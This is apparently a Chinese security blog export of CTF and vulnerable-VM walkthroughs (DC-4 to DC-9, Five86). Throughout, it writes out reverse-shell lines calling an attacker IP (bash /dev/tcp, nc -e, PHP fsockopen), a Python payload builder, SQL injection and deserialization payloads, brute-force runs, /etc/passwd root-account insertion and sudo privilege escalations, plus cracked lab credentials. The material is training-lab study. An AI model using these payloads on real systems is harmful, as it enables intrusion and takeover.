如果可以构造如下的类并将序列化字符串传入，就可以读取到flag &lt;?php class helper { protected $ifview = True; protected $config = &quot;&quot;; public function __construct() { $this-&gt;config = &quot;flag&quot;; } } $a = new helper(); $b = serialize($a); var_dump($b); ?&gt; 在show.php中存在反序列化函数，跟随变量attr_temp，看到此变量来源于数据库中attr列。 public function Get_All_Images(){ $sql = &quot;SELECT * FROM images&quot;; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0){ while($row = $result-&gt;fetch_assoc()){ if($row[&quot;attr&quot;]){ $attr_temp = str_replace(&#39;\\0\\0\\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]); $attr = unserialize($attr_temp); } echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;; } }else{ echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;; } mysqli_close($this-&gt;con); } 在helper.php中的upload函数中我们得知数据库一共有title，filename，ext，path，attr五列，其中attr列内容来源于上传图像的长宽序列化数组，很难进行控制。 $array[&quot;title&quot;] = $fileinfo[&#39;title&#39;]; $array[&quot;filename&quot;] = $fileinfo[&#39;filename&#39;]; $array[&quot;ext&quot;] = $fileinfo[&#39;ext&#39;]; $array[&quot;path&quot;] = $fileinfo[&#39;path&#39;]; $img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]); $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]); $array[&quot;attr&quot;] = serialize($my_ext); 查看helper.php中的数据库操作函数，对输入数据库的数据没有做任何过滤。 foreach($data as $key=&gt;$value){ $key_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $key); $value_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $value); $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;; $sql_val[] = &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;; } $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; mysqli_query($con, $sql); 回想前面的5列中，我们可控的且没有过滤的是filename列也就是文件名，可以构造文件名为序列化字符串，出发unserialize函数，读取任意文件。 title_value&#39;,&#39;filename_value&#39;,&#39;ext_value&#39;,&#39;path_value&#39;,&#39;O:6:&quot;helper&quot;:2:{s:9:&quot;*ifview&quot;;b:1;s:9:&quot;*config&quot;;s:4:&quot;flag&quot;;}#php 难题是在序列化中，所有的private和protected变量序列化之后都会出现不可见字符。将序列化的内容输出，使用Hex Fiend打开，可以看到在星号*两侧是存在不可见字符00的。直接复制输出的话是无法传入这两个字符的。在前面数据库插入操作的时候，将00*00转换为\\0\\0\\0了，在反序列化之前又转换了回来。 由于上传时文件名不允许出现引号，配合数据库将0x开头的字符串默认为16进制的特点，最终payload为 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D)#.jpg 将实际插入数据库的语句改写为，完成注入，反序列化读取数据库中的恶意代码，访问show.php,完成文件读取。 INSERT INTO images(&#39;title&#39;,&#39;filename&#39;,&#39;ext&#39;,&#39;path&#39;,&#39;attr&#39;) VALUES (&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D)#) easy_serialize_php首先进去就可以看到源码 &lt;?php $function = @$_GET[&#39;f&#39;]; function filter($img){ $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;; return preg_replace($filter,&#39;&#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[&quot;user&quot;] = &#39;guest&#39;; $_SESSION[&#39;function&#39;] = $function; extract($_POST); //extract变量覆盖 if(!$function){ echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;; } if(!$_GET[&#39;img_path&#39;]){ $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;); }else{ $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;])); //sha1加密 } $serialize_info = filter(serialize($_SESSION)); if($function == &#39;highlight_file&#39;){ highlight_file(&#39;index.php&#39;); }else if($function == &#39;phpinfo&#39;){ eval(&#39;phpinfo();&#39;); //maybe you can find something in here! }else if($function == &#39;show_image&#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); } 知识点 extract变量覆盖 反序列化字符串逃逸 解题首先查看phpinfo发现php.ini中设置了auto_prepend_file隐式包含了d0g3_f1ag.php,本题就是要读取该文件 0x01 extract变量覆盖extract()函数 该函数使用数组键名作为变量名，使用数组的键值作为变量值 其实本是知道这个知识点的,但是理解不够深入,导致自己一直没有利用到该知识点 当我们$_GET传入的是_session[img]=“index.php”时,经过了extract函数后会产生$_session[img]=index.php 这里分析代码 先是赋值: $_SESSION[“user”] = ‘guest’;$_SESSION[‘function’] = $function; //若想要显示源码,$f=’show_image’; $_SESSION[‘img’]也只能等于base64_encode(‘guest_img.png’);因为若我们传入参数img_PATH的话img的值会进行sha1加密,而后面是没有解密的 可知三个变量都是我们不能控制的,这里就能够有很多种解了,通过extract()进行变量覆盖 0x02 反序列化字符串逃逸_session可控后,就可以有很多种解法了,这里提供两种解法: 值逃逸payload1:_SESSION[user]=flagflagflagflagflagflagflagphp&amp;_SESSION[function]=function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}传入的字符串反序列化后: a:3;{s:4:&quot;user&quot;;s:31:&quot;flagflagflagflagflagflagflagphp&quot;; s:8:&quot;function&quot;;s:82:&quot;function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 经过过滤函数后: a:3;{s:4:&quot;user&quot;;s:31:&quot;&quot;;s:8:&quot;function&quot;;s:82:&quot;function&quot;; s:8:&quot;function&quot;;s:10:&quot;show_image&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 键逃逸payload2:_SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} 传入的字符串反序列化后: a:2:{s:7:&quot;flagphp&quot;; s:48:&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 经过过滤函数后: a:2:{s:7:&quot;&quot;;s:48:&quot;; s:1:&quot;a&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot; //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 还有就是写payload最好在本地写,然后看它反序列化后的样子在更改,不然有些小毛病自己发现不了(现在能力太差了) 然后继续读就可以了 [安洵杯 2020]Web-Bash-Vino0o0o题目代码 &lt;?php highlight_file(__FILE__); if(isset($_POST[&quot;cmd&quot;])) { $test = $_POST[&#39;cmd&#39;]; $white_list = str_split(&#39;$&quot;; #01 n[2]=&quot;$(($&lt;&lt;$))&quot; #10 n[3]=&quot;$(($(($&lt;&lt;$))|$))&quot; #11 n[4]=&quot;$(($(($&lt;&lt;$))&lt;&lt;$))&quot; #100 n[5]=&quot;$(($(($(($&lt;&lt;$))&lt;&lt;$))|$))&quot; #101 n[6]=&quot;$(($(($(($&lt;&lt;$))&lt;&lt;$))|$(($&lt;&lt;$))))&quot; #101 n[7]=&quot;$(($(($(($(($&lt;&lt;$))&lt;&lt;$))|$))|$(($&lt;&lt;$))))&quot; #111 然后发现错了,因为不能包含 | n = dict() n[0] = &#39;0&#39; n[1] = &#39;$&#39; #$计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#)) n[2] = &#39;$(($&lt;&lt;$))&#39; #通过位运算得到2 n[3] = &#39;$(($(($&lt;&lt;$))#$$))&#39; #通过二进制11转换为十进制得到3,4,5,6,7 n[4] = &#39;$(($&lt;&lt;$(($&lt;&lt;$))))&#39; n[5] = &#39;$(($(($&lt;&lt;$))#$0$))&#39; n[6] = &#39;$(($(($&lt;&lt;$))#$$0))&#39; n[7] = &#39;$(($(($&lt;&lt;$))#$$$))&#39; ​ 3.转换成数字之后就需要用到&lt;&lt;&lt;来重定向了，但是一层不够，只用一层会出现bash: $&#39;\\154\\163&#39;: command not found这样的报错，得知bash一次解析只能解析到成数字，需要第二次解析。因此需要给原先的命令添加转义字符，最终构造出如下payload:$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\&#39;\\\\$$(($(($&lt;&lt;$))#$0$))$(($&lt;&lt;$(($&lt;&lt;$))))\\\\$$(($(($&lt;&lt;$))#$$0))$(($(($&lt;&lt;$))#$$))\\\\$(($&lt;&lt;$(($&lt;&lt;$))))0\\\\$(($(($&lt;&lt;$))#$0$))$(($(($&lt;&lt;$))#$$$))\\&#39;执行ls命令 脚本 import requests n = dict() n[0] = &#39;0&#39; n[1] = &#39;$&#39; #$计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#)) n[2] = &#39;$(($&lt;&lt;$))&#39; #通过位运算得到2 n[3] = &#39;$(($(($&lt;&lt;$))#$$))&#39; #通过二进制11转换为十进制得到3,4,5,6,7 n[4] = &#39;$(($&lt;&lt;$(($&lt;&lt;$))))&#39; n[5] = &#39;$(($(($&lt;&lt;$))#$0$))&#39; n[6] = &#39;$(($(($&lt;&lt;$))#$$0))&#39; n[7] = &#39;$(($(($&lt;&lt;$))#$$$))&#39; cmd=&quot;bash -i &gt;&amp; /dev/tcp/192.168.182.137/2333 0&gt;&amp;1&quot;; def str_to_oct(cmd): # 命令转换成八进制字符串 s = &quot;&quot; for t in cmd: o = (&#39;%s&#39; % (oct(ord(t))))[2:] s += &#39;\\\\&#39; + o return s def build(cmd): # 八进制字符串转换成字符 payload = &quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\\\\&#39;&quot; s = str_to_oct(cmd).split(&#39;\\\\&#39;) for _ in s[1:]: payload += &quot;\\\\\\\\&quot; for i in _: payload += n[int(i)] return payload + &#39;\\\\\\&#39;&#39; print(build(cmd))","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"Five86-2","slug":"Five86-2","date":"2021-02-19T11:40:09.000Z","updated":"2021-02-24T15:32:36.838Z","comments":false,"path":"2021/02/19/Five86-2/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/19/Five86-2/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.152 访问80端口,发现出了一点小问题，在hosts文件中加入 192.168.182.152 five86-2 这样就好了,在searchsploit和Google并没有发现WordPress 5.1.4的漏洞，还是先访问一下后台 后台登录wpscan扫描先用wpscan扫描一下用户名 wpscan –url http://192.168.182.152 -e u 将用户名保存到user.txt文件中 cewl扫密码cewl http://five86-2/ -w pass.txt 暴力破解 wpscan --url http://192.168.182.152 -U user.txt -P pass.txt 没跑出来 wpscan --url http://192.168.182.152-U user.txt -P /usr/share/wordlists/rockyou.txt 爆破出两个用户的密码 [SUCCESS] - barney / spooky1 [SUCCESS] - stephen / apollo1 Getshell插件漏洞使用darney用户登录一下看看,发现barney用户可以加载插件，然后可以去搜索插件的漏洞，利用插件提权。 安着说明上的做,成功上传木马 准备用蚁剑连接反弹一个shell,但是蚁剑怎么都连不起,就在poc文件里又加了一个nc.php xxx&lt;?php $sock=fsockopen(&quot;192.168.182.137&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); 然后在index.php中?cmd=php nc.php 成功反弹shell 然后使用python进入交互模式 python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 提权提权paultcpdump的抓包以及流量分析去home目录下发现都进不去，打算su到其他用户，尝试刚才爆破出来的两个用户，barney用户密码不对,尝试stephen用户，成功登陆到stephen用户 但是找了半天都没有发现提权的方法 发现用户在pcap用户组里面 查看一下系统进程： ps -auxwww 发现系统运行ftp，由于ftp传输是明文传输，这是时候想到监听系统网卡，分析流量，看看能不能捕捉到ftp的账号密码。启动ftp的是“paul”帐号，使用“stephen”帐号通过tcpdump获取流量，并下载至本地分析。 tcpdump -D 注释：-D 打印出系统中所有可以用tcpdump截包的网络接口。 timeout 120 tcpdump -w hack.pcap -i vethbe01e05 注释： timeout 120，是用来控制 tcpdump 的超时时间为 120s tcpdump -w 保存为 saul.pcap，-i 的意思是指定监听的网络接口 最后读取刚刚获取的数据包发现一个 FTP 账号密码： tcpdump -r hack.pcap PASS esomepasswford 切换到paul用户 提权petersudo -l现可以使用peter用户的service程序 接着我使用 sudo 来以 peter 用户去运行 /usr/sbin/service ，并切换到 /bin/bash ，这个时候就成功切换到 peter 用户： sudo -u peter /usr/sbin/service ../../bin/bash 成功获得peter用户的shell,还是sudo -l一下,发现 提权root直接改root用户密码 sudo -u root passwd root","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"Five86-1","slug":"Five86-1","date":"2021-02-19T02:27:51.000Z","updated":"2021-02-24T15:32:34.819Z","comments":false,"path":"2021/02/19/Five86-1/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/19/Five86-1/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.151 访问一下80端口 扫一下 发现robots文件 禁止爬虫访问/ona目录 漏洞发现我们手动访问一下，发现: 发现了系统和版本,是一个OpenNetAdmin v18.1.1系统 去搜索一下是否有相关漏洞 发现一个远程代码执行漏洞 Getshell在执行时报错了,百度一下发现需要转换格式 执行bash ./19.sh http://192.168.182.151/ona/ 成功拿到shell,（我这里没有加最后的/结果一直没有成功） 经过一番测试，发现这里无法执行的命令是没有回显的，并且不能执行cd命令，但是可以使用ls和cat命令 提权提权douglas执行find命令查看一下我们可以读取的文件 find / -type f -user www-data 发现 /var/www/html/reports/.htaccess /var/log/ona.log 读取var/www/html/reports/.htaccess可以找到AuthUserFile的路径/var/www/.htpasswd htpasswd建立和更新存储用户名、密码的文本文件,读取这个文件如下，可以得到用户名douglas和HASH的密码$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1，给的提示是只包含aefhrt的十个字符 crunch生成字典然后使用crunch生成对应的字典，命令格式crunch &lt;min-len&gt; &lt;max-len&gt; [charset string] [options]，这里生成只包含aefhrt的10个字符，就可以使用如下命令crunch 10 10 aefhrt -o pass.txt John破解密码将密码放入1.txt文件 john --wordlist=pass.txt 1.txt 成功跑出来密码 提权jenssh登录成功获取douglas用户的权限,查看一下无密码使用的命令,发现一个jen权限的cp命令 这里应该是想让我们利用这个cp命令 ssh-keygen -b 2048 # 生成 2048 比特字节的密钥 cp /home/douglas/.ssh/id_rsa.pub /tmp/id_rsa.pub 这个时候我们来到 /tmp（临时目录）下给 authorized_keys 这个文件一个可执行权限，然后使用 sudo以 jen 用户权限去执行 cp 命令，把我们刚刚生成的 authorized_keys移动到 /home/jen/.ssh/ 目录下，这样我们才能登陆它 chmod 777 id_rsa.pub sudo -u jen cp /tmp/id_rsa.pub/home/jen/.ssh/authorized_keys ssh jen@192.168.182.151 成功登录 提权moss使用echo $(find / -type f -user jen) &gt; 1.txt 发现/var/mail/jen 有一封邮件 发现moss用户密码为Fire!Fire! 提权root登录后查看一下SUID权限可执行文件 find / -perm -u=s -type f 2&gt;/dev/null 发现了一个upyourgame具有suid权限然后cd到那个目录下面去执行upyourgame文件","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-9","slug":"DC-9","date":"2021-02-18T13:30:54.000Z","updated":"2021-02-20T02:12:00.661Z","comments":false,"path":"2021/02/18/DC-9/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-9/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.150 数据库攻击访问80端口 发现有像数据库的查询 发现results.php下有sql注入 （这里我最开始写的是search.php结果跑没出来,它search提交到的是results界面,所以这里应该是results.php) sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; --dbs sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; -D Staff --tables sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; -D Staff -T Users --columns sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; -D Staff -T Users -C &quot;Username,Password&quot; --dump 因为密码有md5加密,sqlmap会提示你是否用字典跑,选默认的字典就能跑出来 同样的,也去跑一下users数据库 先留着,后面可能能用上 getshell登录后发现了这个 疑似存在文件包含漏洞，猜测文件参数是file ?file=../../../../etc/passwd 发现用户名和我们之前users数据库中的一样, 然后登录ssh,但是失败了,以为22端口是堵塞状态 knockd服务https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html 端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。 简单来说就是：知道它的自定义端口后，依次对其进行敲门，然后就可以开启ssh服务从而进行连接了。它的默认配置文件为：/etc/knockd.conf 所以现在就是要知道它的这个配置文件的内容就可以得到它自定义的端口号，用文件包含漏洞把这个文件爆出来： 确实有这个配置文件，那么就先用knock命令使得靶机的SSH端口对我的攻击机开放： sudo apt-get install knockd # 安装knockd工具，其中包括knock命令 knock 192.168.182.150 7469 8475 9842 # 使用序列号knock靶机 然后将刚才sqlmap跑出来的账号密码写入两个文件中准备撞库 hydra -L users.txt -P password.txt 192.168.211.142 ssh -vV 跑出来 login: chandlerb password: UrAG0D! login: joeyt password: Passw0rd login: janitor password: Ilovepeepee 第一个和第二个不能访问其他目录 用第三个janitor登录发现有隐藏目录 进入.secrets-for-putin 将这些密码放入密码文件中,再一次爆破,成功爆破出fredf用户密码 login: fredf password: B4-Tru3-001 提权 发现为python文件 打开发现看不懂,应该是编译后的python文件,去找一下源文件 find / -name test.py -print 2&gt;/dev/null #发现/opt/devstuff/test.py cat /opt/devstuff/test.py #!/usr/bin/python import sys if len (sys.argv) != 3 : print (&quot;Usage: python test.py read append&quot;) sys.exit (1) else : f = open(sys.argv[1], &quot;r&quot;) output = (f.read()) f = open(sys.argv[2], &quot;a&quot;) f.write(output) f.close() 该py文件就是将一文件内容追加到指定文件的后面。（由于存在sudo权限，可以向/etc/passwd文件写入拥有root权限的账户） 构造加密密码： openssl passwd -1 -salt admin 123456 构造新的用户： admin:1 11admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash 将此串内容保存到一个文件中（一般选取家目录的文件或者/tmp临时文件） echo &#39;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#39; &gt;&gt; /tmp/admin 接下来运行test文件，写入/etc/passwd: sudo ./test /tmp/admin /etc/passwd 登录设置的用户：su admin获取到root权限 成功登录","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-8","slug":"DC-8","date":"2021-02-18T10:24:42.000Z","updated":"2021-02-24T15:31:41.094Z","comments":false,"path":"2021/02/18/DC-8/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-8/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.149 访问80端口 数据库攻击点击Who We Are 发现url出现nid=2，加个单引号试试，发现sql注入 用sqlmap跑，当然这里就是一个union的整形注入,手工注入也可以 sqlmap -u http://192.168.182.149/?nid=1 -D d7db -T users -C &quot;name,pass&quot; --dump #爆数据 +——-+———————————————————+| name | pass |+——-+———————————————————+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+——-+———————————————————+ 破解密码有个john用户,估计是要让我们破解john的密码 成功登录 Getshell到处乱找找到了可以添加代码的地方 在Add content–&gt;Webform去添加webshell 但是找不到路劲,无法执行php代码 改为反弹shell &lt;?php system(&quot;nc -e /bin/bash 192.168.182.137 2333&quot;); ?&gt; 然后发现代码需要提交表单才能执行,只有又去修改Contact Us里的WEBFORM 然后提交表单 但是一直成功不了,我也不知道为什么,加了个标签后退出登录提交表单又成功了 python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 进入交互模式 提权去home目录下看了发现没有东西 然后 sudo -l 不行 查看具有root权限的命令 find / -perm -u=s -type f 2&gt;/dev/null 发现exim4,–version查看版本为4.89 本地找一下发现有一个可以提权的漏洞 本地开启8000端口 python -m SimpleHTTPServer 8000 使用wget下载，发现只有在tmp目录下有权限 www-data@dc-8:/tmp$ wget http://192.168.182.137:8000/46996.sh 使用中报错了，需要对exp脚本进行编码 vim 46996.sh #应该是回kali中进行编码,然后重新下载,我在获取的shell中修改还是报错 :set ff=unix :wq 然后加权限 chmod +777 46996.sh 按照脚本中所说的 加 -m netcat 成功获取root权限","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-7","slug":"DC-7","date":"2021-02-18T08:43:55.000Z","updated":"2021-02-20T02:05:51.219Z","comments":false,"path":"2021/02/18/DC-7/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-7/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.148 访问80端口 并且提示我们暴力破解是没有办法成功的 Github泄露网站数据库配置信息导致泄露SSH然后看到左下角有一个@DC7USER 谷歌搜索了一下，发现github上有该用户保存的代码,打开config文件看一下 提权登录一下ssh，成功登录 提权www-data然后发现了几封邮件,发现一个backups.sh文件,而且根据实践来看是每15分钟root用户会执行一次 运行一下sh文件发现没啥用,再查看一下内容 如果我们能修改内容,就能以root权限执行命令,但我们没有办法修改内容,查看一下权限 发现www-data对其也有rwx权限 而且关注到这个drush命令，是drupal框架中用来做一些配置的命令，它可以改变用户名密码，格式如下： drush user-password admin --password=&quot;new_pass&quot; 进入到/var/www/html目录下，因为网站会有一个admin用户，所以使用drush命令修改admin用户的密码为123456，发现可以修改成功 drush user-password admin --password=&quot;123456&quot; 使用密码成功登录到后台 尝试一句话木马 尝试编辑一下文章 但是并没有安装php环境，去Extends模块安装 https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz 写下我们的一句话木马 成功用蚁剑连接 发现安装了nc,使用nc反弹shell nc -e /bin/bash 192.168.211.135 333 获取交互式shell python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 垂直提权去修改一下backups.sh文件 echo nc -e /bin/bash 192.168.187.130 6666 &gt; backups.sh 然后等backups.sh下一次被root用户执行","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-6","slug":"DC-6","date":"2021-02-18T01:55:10.000Z","updated":"2021-02-20T02:03:05.037Z","comments":false,"path":"2021/02/18/DC-6/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-6/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.147 浏览器地址栏输入靶机IP地址，发现显示域名但无法解析域名导致无法访问网站 host文件添加: 192.168.182.147 wordy 成功访问 查看一下cms 找到后台登录地址 后台登录使用cewl工具破解密码cewl http://wordy -w PASS.TXT 使用wpscan跑用户名wpscan --url http://wordy wpscan --url http://wordy -e u #将扫出的用户名保存到USER.TXT 暴力破解先用的PASS.TXT结果没有跑出来,然后官方线索里面有这样一句话 rockyou.txt，这个字典非常庞大，有几千万的数据，如果使用整个字典爆破的话要花费很长时间，所以先输入提示中的命令来筛选一些密码保存到文件中，再进行爆破。 wpscan --url wordy -U USER.TXT -P passwords.txt 成功爆出密码 Username: mark, Password: helpdesk01 登录后台 漏洞发现在后台里面发现activity monitor插件，我们尝试搜索这个插件的漏洞 searchsploit activity monitor 发现一个csrf漏洞 getshell修改一下 但是没有成功 抓包修改了一下poc 成功getshell 进入交互界面 python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 提权成功getshell之后在home目录下一顿乱翻 发现 估计添加了个新用户 成功登录 执行：sudo -l，在/home/jens目录下发现一个sh文件，如果以jens身份执行不需要密码。cat查看文件内容发现是对网站的打包命令，作用是备份网站根目录。 越权jens那么如果在这个文件中写入/bin/bash命令，然后以jens用户身份运行就可以获取到jens的shell了。命令： echo &quot;/bin/bash&quot; &gt;&gt; backups.sh sudo -u jens ./backups.sh 越权root执行sudo -l命令，发现在jens的shell下，可以在不需要密码的情况下，以root的身份权限执行nmap nmap工具是可以执行脚本的，那么我们把弹root用户shell的命令写入到nmap的脚本里面，然后用nmap命令执行即可切换到root用户的shell。命令： echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; 2.sh sudo nmap --script=2.sh 获取flag","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-5","slug":"DC-5","date":"2021-02-17T13:03:03.000Z","updated":"2021-02-20T02:01:08.617Z","comments":false,"path":"2021/02/17/DC-5/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/17/DC-5/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.145 getshell我们尝试访问80端口发现网页全是静态的 ，只有一个提交留言的窗口 在提交后的页面下,我们发现我们传的变量全部都在url里面 而且我们每次刷新下面也在不断改变 我们访问foorer.php 也是在不断改变,这里很有可能是直接include包含了footer.php文件, 然后使用burp爆破变量名 说明file很有可能是传参的变量，尝试/etc/passwd成功执行 上传一句话进行日志包含 蚁剑终端连接 cat thankyou.php #文件包含代码 &lt;footer&gt; &lt;?php $file = $_GET[&#39;file&#39;]; if(isset($file)) { include(&quot;$file&quot;); } else { include(&quot;footer.php&quot;); } ?&gt; &lt;/footer&gt; 提权screen软件提权su -l 查看是否有命令在执行期间有root权限并且没有密码保护，但是没有 然后查看一些具有suid权限的命令 find / -perm -u=s -type f 2&gt;/dev/null 发现一个软件screen-4.5.0具有root权限,搜索一下是否有相关漏洞 脚本搜索 编译脚本发现提权脚本,然后按着脚本编译好libhax.so和rootshell,用wget上传至靶机 tmp目录 上传脚本然后开启一个8000端口服务让我们的靶机下载libhax.so和rootshell文件 python -m SimpleHTTPServer 8000 提权将rootshell和libhax.so下载下来,然后用脚本里的方法提权 成功获得root权限","categories":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://pp1ove.gitee.io/tags/渗透/"}],"keywords":[{"name":"靶机","slug":"靶机","permalink":"https://pp1ove.gitee.io/categories/靶机/"}]},{"title":"DC-4","slug":"DC-4","date":"2021-02-17T11:23:58.000Z","updated":"2021-02-20T01:59:37.246Z","comments":false,"path":"2021/02/17/DC-4/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/17/DC-4/","excerpt":"","text":"信息搜集主机发现nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.144 getshell打开网页发现一个登录框 直接暴力破解 登录成功后 可以查看文件列表之类的,下main也有语句You have selected :ls -l,这里应该是可以执行命令的,抓个包看一下 果然存在radio参数,可以控制我们所执行的命令 